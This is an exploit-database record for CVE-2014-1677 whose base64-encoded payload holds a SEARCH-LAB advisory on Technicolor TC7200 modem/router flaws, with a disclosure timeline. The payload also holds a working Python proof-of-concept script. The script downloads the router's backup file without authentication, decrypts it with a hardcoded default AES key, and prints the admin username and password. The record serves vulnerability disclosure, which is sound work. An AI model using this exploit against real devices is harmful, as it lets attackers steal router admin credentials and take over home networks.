{
    "source": "exploit-database", 
    "exploit": "JycnDQpUZWNobmljb2xvciBUQzcyMDAgbW9kZW0vcm91dGVyIG11bHRpcGxlIHZ1bG5lcmFiaWxpdGllcw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KUGxhdGZvcm1zIC8gRmlybXdhcmUgY29uZmlybWVkIGFmZmVjdGVkOg0KLSBUZWNobmljb2xvciBUQzcyMDAsIFNURDYuMDIuMTENCi0gUHJvZHVjdCBwYWdlOiBodHRwOi8vd3d3LnRlY2huaWNvbG9yLmNvbS9lbi9zb2x1dGlvbnMtc2VydmljZXMvY29ubmVjdGVkLWhvbWUvYnJvYWRiYW5kLWRldmljZXMvY2FibGUtbW9kZW1zLWdhdGV3YXlzL3RjNzIwMC10YzczMDANCg0KVnVsbmVyYWJpbGl0aWVzDQotLS0tLS0tLS0tLS0tLS0NCkluc2VjdXJlIHNlc3Npb24gbWFuYWdlbWVudA0KDQpUaGUgd2ViIGludGVyZmFjZSBkb2VzIG5vdCB1c2UgY29va2llcyBhdCBhbGwgYW5kIGRvZXMgbm90IGNoZWNrIHRoZSBJUA0KYWRkcmVzcyBvZiB0aGUgY2xpZW50LiBJZiBhZG1pbiBsb2dpbiBpcyBzdWNjZXNzZnVsLCBldmVyeSB1c2VyIGZyb20gdGhlDQpMQU4gY2FuIGFjY2VzcyB0aGUgbWFuYWdlbWVudCBpbnRlcmZhY2UuDQoNCkJhY2t1cCBmaWxlIGVuY3J5cHRpb24gdXNlcyBmaXggcGFzc3dvcmQNCg0KVGVjaG5pY29sb3IgZml4ZWQgdGhlIENWRS0yMDE0LTE2NzcgYnkgZW5jcnlwdGluZyB0aGUgYmFja3VwIGZpbGUgd2l0aA0KQUVTLiBIb3dldmVyLCB0aGUgZW5jcnlwdGVkIGJhY2t1cCBmaWxlIHJlbWFpbnMgYWNjZXNzaWJsZSB3aXRob3V0DQphdXRoZW50aWNhdGlvbiBhbmQgaWYgdGhlIHBhc3N3b3JkIGlzIG5vdCBzZXQgaW4gdGhlIHdlYiBpbnRlcmZhY2UgYQ0KZGVmYXVsdCBwYXNzd29yZCBpcyB1c2VkLiBTbywgaWYgYW4gYXR0YWNrZXIgYWNjZXNzZXMgdGhlIGJhY2t1cCBmaWxlDQp3aXRob3V0IGF1dGhlbnRpY2F0aW9uLCB0aGUgcGFzc3dvcmQgY2Fubm90IGJlIHNldCwgYW5kIHRoZSBiYWNrdXAgZmlsZQ0KY2FuIGJlIGRlY3J5cHRlZC4NCg0KVGltZWxpbmUNCi0tLS0tLS0tDQoNCi0gMjAxNS4wNy4zMDogV2Ugc2VudCBzb21lIG5ldyBpc3N1ZXMgYWZmZWN0aW5nIHRoZSBVYmVlIHJvdXRlciBhbmQgb3RoZXIgZmluZGluZ3MgaW4gVGVjaG5pY29sb3IgVEM3MjAwIGFuZCBDaXNjbyBFUEMzOTI1IGRldmljZXMgdG8gVVBDDQotIEJldHdlZW4gMjAxNS4wNy4zMSBhbmQgMDguMTIgdGhlcmUgd2VyZSBzZXZlcmFsIGUtbWFpbCBhbmQgcGhvbmUgY29tbXVuaWNhdGlvbnMgYmV0d2VlbiB0ZWNobmljYWwgcGVyc29ucyBmcm9tIExpYmVydHkgR2xvYmFsIHRvIGNsYXJpZnkgdGhlIGZpbmRpbmdzDQotIDIwMTUuMDguMTk6IFVQQyBzZW50IG91dCBhZHZpc29yeSBlbWFpbHMgdG8gaXRzIGVuZCB1c2VycyB0byBjaGFuZ2UgdGhlIGRlZmF1bHQgV2lGaSBwYXNzcGhyYXNlDQotIDIwMTYuMDEuMjc6IFVQQyBNYWd5YXJvcnN6YWcgc2VuZCBvdXQgYSByZXBlYXRlZCB3YXJuaW5nIHRvIGl0cyBlbmQgdXNlcnMgYWJvdXQgdGhlIGltcG9ydGFuY2Ugb2YgdGhlIGNoYW5nZSBvZiB0aGUgZGVmYXVsdCBwYXNzcGhyYXNlcy4NCi0gMjAxNi4wMi4xNjogRmFjZSB0byBmYWNlIG1lZXRpbmcgd2l0aCBMaWJlcnR5IEdsb2JhbCBzZWN1cml0eSBwZXJzb25uZWwgaW4gQW1zdGVyZGFtIGhlYWRxdWFydGVycw0KLSAyMDE2LjAyLjE4OiBBIHByb3Bvc2FsIHdhcyBzZW50IHRvIExpYmVydHkgR2xvYmFsIHN1Z2dlc3RpbmcgYSB3YXJkcml2aW5nIGV4cGVyaW1lbnQgaW4gQnVkYXBlc3QsIEh1bmdhcnkgdG8gbWVhc3VyZSB0aGUgcmF0ZSBvZiBlbmQgdXNlcnMgd2hvIGFyZSBzdGlsbCB1c2luZyB0aGUgZGVmYXVsdCBwYXNzcGhyYXNlcy4NCg0KUE9DDQotLS0NClBPQyBzY3JpcHQgaXMgYXZhaWxhYmxlIHRvIGRlbW9uc3RyYXRlIHRoZSBmb2xsb3dpbmcgcHJvYmxlbXMgWzJdOg0KLSBVbmF1dGhlbnRpY2F0ZWQgYmFja3VwIGZpbGUgYWNjZXNzDQotIEJhY2t1cCBmaWxlIGRlY3J5cHRpb24NCg0KUmVjb21tZW5kYXRpb25zDQotLS0tLS0tLS0tLS0tLS0NClNpbmNlIG9ubHkgdGhlIElTUCBjYW4gdXBkYXRlIHRoZSBmaXJtd2FyZSwgd2UgY2FuIHJlY29tbWVuZCBmb3IgdXNlcnMNCnRvIGNoYW5nZSB0aGUgV2lGaSBwYXNzcGhyYXNlLg0KDQpDcmVkaXRzDQotLS0tLS0tDQpUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQgYW5kIHJlc2VhcmNoZWQgYnkgR2VyZ2VseSBFYmVyaGFyZHQNCmZyb20gU0VBUkNILUxBQiBMdGQuICh3d3cuc2VhcmNoLWxhYi5odSkNCg0KUmVmZXJlbmNlcw0KLS0tLS0tLS0tLQ0KWzFdIGh0dHA6Ly93d3cuc2VhcmNoLWxhYi5odS9hZHZpc29yaWVzL3NlY2Fkdi0yMDE2MDcyMA0KWzJdIGh0dHBzOi8vZ2l0aHViLmNvbS9lYnV4L0NhYmxlLW1vZGVtcy90cmVlL21hc3Rlci9UZWNobmljb2xvcg0KJycnDQojDQojIFBPQyBjb2RlIGZvciBUZWNobmljb2xvciBUQzcyMDANCiMNCiMgRGVtb25zdHJhdGVzIHRoZSBmb2xsb3dpbmcgdnVsbmVyYWJpbGl0aWVzDQojICAtIFVuYXV0aGVudGljYXRlZCBiYWNrdXAgZmlsZSBhY2Nlc3MNCiMgIC0gQmFja3VwIGZpbGUgZGVjcnlwdGlvbg0KIw0KIyBDcmVkaXQ6IEdlcmdlbHkgRWJlcmhhcmR0IChAZWJ1eDI1KSBmcm9tIFNFQVJDSC1MQUIgTHRkLiAod3d3LnNlYXJjaC1sYWIuaHUpDQojDQojIEFkdmlzb3J5OiBodHRwOi8vd3d3LnNlYXJjaC1sYWIuaHUvYWR2aXNvcmllcy9zZWNhZHYtMjAxNTA3MjANCg0KaW1wb3J0IHN5cw0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc3RydWN0DQppbXBvcnQgYmluYXNjaWkNCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTDQoNCmNsYXNzIHRlY2huaWNvbG9yOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBhZGRyLCBwb3J0KToNCiAgICAgICAgc2VsZi5hZGRyID0gYWRkcg0KICAgICAgICBzZWxmLnBvcnQgPSBwb3J0DQogICAgICAgIHNlbGYucyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KDQogICAgZGVmIGdldFVyaShzZWxmLCB1cmkpOg0KICAgICAgICByZXR1cm4gJ2h0dHA6Ly8lczolZC8lcyclKHNlbGYuYWRkcixzZWxmLnBvcnQsdXJpKQ0KDQogICAgZGVmIGRvd25sb2FkQmFja3VwRmlsZShzZWxmKToNCiAgICAgICAgciA9IHNlbGYucy5nZXQoc2VsZi5nZXRVcmkoJ2dvZm9ybS9zeXN0ZW0vR2F0ZXdheVNldHRpbmdzLmJpbicpKQ0KICAgICAgICByZXNwID0gJycNCiAgICAgICAgZm9yIGNodW5rIGluIHI6DQogICAgICAgICAgICByZXNwICs9IGNodW5rDQogICAgICAgIHJldHVybiByZXNwDQoNCiAgICBkZWYgcGFyc2VCYWNrdXAoc2VsZiwgYmFja3VwKToNCiAgICAgICAgcCA9IGJhY2t1cC5maW5kKCdNTG9nJykNCiAgICAgICAgaWYgKHAgPiAwKToNCiAgICAgICAgICAgIHAgKz0gNg0KICAgICAgICAgICAgbmggPSBzdHJ1Y3QudW5wYWNrKCchSCcsYmFja3VwW3A6cCsyXSlbMF0NCiAgICAgICAgICAgIG5hbWUgPSBiYWNrdXBbcCsyOnArMituaF0NCiAgICAgICAgICAgIHAgKz0gMituaA0KICAgICAgICAgICAgcGggPSBzdHJ1Y3QudW5wYWNrKCchSCcsYmFja3VwW3A6cCsyXSlbMF0NCiAgICAgICAgICAgIHB3ZCA9IGJhY2t1cFtwKzI6cCsyK25oXQ0KICAgICAgICAgICAgcmV0dXJuIChuYW1lLHB3ZCkNCiAgICAgICAgcmV0dXJuICgnJywnJykNCg0KICAgIGRlZiBkZWNyeXB0QmFja3VwKHNlbGYsIGJhY2t1cCk6DQogICAgICAgIGtleSA9IGJpbmFzY2lpLnVuaGV4bGlmeSgnMDAwMTAyMDMwNDA1MDYwNzA4MDkwQTBCMEMwRDBFMEYxMDExMTIxMzE0MTUxNjE3MTgxOTFBMUIxQzFEMUUxRicpDQogICAgICAgIGwgPSAobGVuKGJhY2t1cCkvMTYpKjE2DQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcoa2V5LCBBRVMuTU9ERV9FQ0IsICdceDAwJyooMTYpKQ0KICAgICAgICBwbGFpbiA9IGNpcGhlci5kZWNyeXB0KGJhY2t1cFswOmxdKQ0KICAgICAgICByZXR1cm4gcGxhaW4NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCmlmIChsZW4oc3lzLmFyZ3YpIDwgMik6DQogICAgcHJpbnQgJ3RlY2huaWNvbG9yX3RjNzIwMF9wb2MucHkgYWRkciBbcG9ydF0nDQphZGRyID0gc3lzLmFyZ3ZbMV0NCnBvcnQgPSA4MA0KaWYgKGxlbihzeXMuYXJndikgPT0gMyk6DQogICAgcG9ydCA9IGludChzeXMuYXJndlsyXSkNCg0KIyBjcmVhdGUgdGVjaG5pY29sb3Igb2JqZWN0DQp0ID0gdGVjaG5pY29sb3IoYWRkciwgcG9ydCkNCg0KYmFja3VwID0gdC5kb3dubG9hZEJhY2t1cEZpbGUoKQ0KaWYgKGxlbihiYWNrdXApID4gMCk6DQogICAgb3BlbigndGVzdC5lbmMnLCAnd2InKS53cml0ZShiYWNrdXApDQogICAgcGxhaW4gPSB0LmRlY3J5cHRCYWNrdXAoYmFja3VwKQ0KICAgIG9wZW4oJ3Rlc3QuZGVjJywgJ3diJykud3JpdGUocGxhaW4pDQoNCiAgICAobmFtZSwgcHdkKSA9IHQucGFyc2VCYWNrdXAocGxhaW4pDQogICAgaWYgKG5hbWUgIT0gJycpOg0KICAgICAgICBwcmludCAnYWRtaW4gbmFtZTogJXMsIHB3ZDogJXMnJShuYW1lLHB3ZCk=", 
    "filename": "platforms/cgi/webapps/40157.py", 
    "id": "40157", 
    "cves": [
        "CVE-2014-1677"
    ]
}